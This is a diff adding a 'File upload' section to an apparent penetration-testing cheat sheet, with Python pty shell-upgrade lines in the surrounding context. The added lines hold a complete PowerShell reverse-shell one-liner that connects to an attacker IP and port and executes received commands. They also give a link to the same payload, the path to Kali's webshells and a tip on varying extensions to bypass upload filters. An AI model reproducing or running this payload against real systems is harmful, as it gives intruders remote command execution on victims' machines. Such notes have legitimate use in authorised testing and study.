@@ -55,8 +55,15 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-
 ## File upload
+
+Test rarer extensions and upper/lowercase mix. \
+Powershell reverse shell: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+```
+$client = New-Object System.Net.Sockets.TCPClient('$AttackerIp',$AttackerPort);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+Beware of simple and double quotes... \
+Webshells on Kali: `/usr/share/webshells`
 
 ## Command injection
 
